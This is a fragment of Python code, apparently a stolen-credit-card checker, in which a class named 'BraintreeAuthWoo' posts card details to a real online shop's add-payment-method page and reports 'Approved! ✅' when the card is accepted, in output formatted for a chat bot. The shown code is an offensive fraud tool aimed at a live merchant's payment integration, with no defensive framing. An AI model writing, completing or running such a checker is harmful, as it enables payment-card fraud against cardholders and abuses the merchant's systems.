...
class BraintreeAuthWoo:
    ...
    def main(self,cards):
        try: 
            ...
            sexo = self.session.post('https://bulkmemorycards.com/my-account/add-payment-method/', headers=headers, data=data)
            time.sleep(15)
            self.session.close()
            if 'Payment method successfully added.' in sexo.text:  return 'Approved! ✅', '<code>Approved (1000)</code></b>'
